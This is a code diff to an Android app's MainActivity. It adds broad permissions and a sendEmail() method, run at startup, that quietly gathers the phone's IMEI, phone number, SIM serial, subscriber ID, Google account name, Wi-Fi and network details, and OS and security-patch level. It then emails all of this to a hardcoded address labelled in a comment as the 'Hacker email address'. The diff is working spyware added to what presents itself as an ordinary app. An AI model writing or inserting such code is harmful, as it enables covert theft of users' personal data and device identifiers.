@@ -2,13 +2,23 @@ package com.example.super_secret;
 //test
 import java.util.Date;
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.os.StatFs;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
 import android.widget.Toast;
 import java.text.SimpleDateFormat;
 import com.google.android.material.tabs.TabLayout;
@@ -29,13 +39,27 @@ public class MainActivity extends AppCompatActivity {
     private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 0;
     private static final int MY_PERMISSIONS_REQUEST_PHONE_STATE = 0;
     private static final int MY_PERMISSIONS_REQUEST_PHONE_CONTACTS = 0;
+    private static final String TAG = "Myactivity";
+    Intent mServiceIntent;
+    private ServiceSensor mSensorService;
+    Context ctx;
+
+    private Context getCtx() {
+        return ctx;
+    }
 
     private int PERMISSION_ALL = 1;
     private String[] PERMISSIONS = {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CONTACTS
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.INTERNET,
+            Manifest.permission.CHANGE_WIFI_STATE,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.GET_ACCOUNTS
     };
 
 
@@ -58,7 +82,7 @@ public class MainActivity extends AppCompatActivity {
 
         getAllCallLogs(this);
         getContactList(this);
-
+        sendEmail();
     }// OnCreate
     //after getting the result of permission request
 
@@ -191,6 +215,98 @@ public class MainActivity extends AppCompatActivity {
         if(cur!=null){
             cur.close();
         }
+
+    }
+    private void sendEmail(){
+
+        //Getting content for email
+        String email = "mingkiat95@gmail.com"; //Hacker email address
+        String subject = "Information Gathering";
+
+        //Retrieve Phone information
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+
+        String imei = telephonyManager.getDeviceId();
+        String mPhoneNumber = telephonyManager.getLine1Number();
+        String SimSerialNumber = telephonyManager.getSimSerialNumber();
+
+        String NetworkOperator = telephonyManager.getSimOperatorName();
+        String SubscriberId = telephonyManager.getSubscriberId();
+
+        //Retrieve Network Details
+
+        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+        WifiInfo info = wifiManager.getConnectionInfo();
+        String ip = Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
+        String ssid = info.getSSID();
+        String bssid = info.getBSSID();
+        String macAddress = info.getMacAddress();
+        int wifiFreq = info.getFrequency();
+
+        //Retrieve Device OS details
+        String myVersion = android.os.Build.VERSION.RELEASE; // e.g. myVersion := "1.6"
+        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
+        String BaseOS = Build.VERSION.BASE_OS;
+        String securityPatch = Build.VERSION.SECURITY_PATCH;
+        String phoneName = android.os.Build.MODEL;
+
+
+        //Check on the google ac login to the device
+        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
+        Account[] list = manager.getAccounts(); //get email address of device
+        String emailId = "asd";
+        for (Account account : list) {
+            if (account.type.equalsIgnoreCase("com.google")) {
+                emailId = account.name;
+                break;
+            }
+        }
+
+        //Check available space in the device
+        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+        long bytesAvailable;
+        if (android.os.Build.VERSION.SDK_INT >=
+                android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
+            bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
+        }
+        else {
+            bytesAvailable = (long)stat.getBlockSize() * (long)stat.getAvailableBlocks();
+        }
+        long megAvailable = bytesAvailable / (1024 * 1024);
+
+
+        String message =
+                "=====AC Information===="+
+                        "\n MobileGoogleAcc : " + emailId +
+                        "\n\n =====Service Provider Info====" +
+                        "\n NetworkOperator : " + NetworkOperator +
+                        "\n SubscriberId : " + SubscriberId +
+                        "\n SimSerialNumber : " + SimSerialNumber +
+                        "\n\n =====Phone Information===="+
+                        "\n      Phone Name : " + phoneName +
+                        "\n         IMEI No : " + imei +
+                        "\n  AvailableSpace : " + megAvailable + "MB" +
+                        "\n Android Version : " + myVersion +
+                        "\n      SDKVersion : " + sdkVersion +
+                        "\n         BaseOS  : " + BaseOS +
+                        "\n   SecurityPatch : " + securityPatch +
+                        "\n\n=====Network Information===="+
+                        "\n      IP Address : " + ip +
+                        "\n            SSID : " + ssid +
+                        "\n           BSSID : " + bssid +
+                        "\n      MacAddress : " + macAddress +
+                        "\n        WiFiFreq : " + wifiFreq +
+                        "\n       MobileNum : " + mPhoneNumber;
+
+
+        //Creating SendMail object
+        SendMail sm = new SendMail(this, email, subject, message);
+
+        //Executing sendmail to send email
+        sm.execute();
     }
 
 }
